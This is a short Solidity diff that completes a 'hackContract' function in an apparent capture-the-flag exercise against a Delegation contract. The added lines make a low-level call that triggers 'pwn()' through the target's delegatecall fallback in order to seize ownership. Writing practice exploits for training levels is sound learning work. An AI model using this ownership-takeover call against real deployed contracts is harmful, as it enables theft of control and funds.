@@ -2,6 +2,8 @@
 pragma solidity ^0.8.9;
 import "./Delegation.sol";
 
+error AttackingDelegation__CallUnsuccessful();
+
 contract AttackingDelegation {
     address public contractAddress;
 
@@ -11,5 +13,10 @@ contract AttackingDelegation {
 
     function hackContract() external {
         // Code me!
+        (bool success, ) = contractAddress.call(abi.encodeWithSignature("pwn()"));
+        
+        if (!success) {
+            revert AttackingDelegation__CallUnsuccessful();
+        }
     }
 }
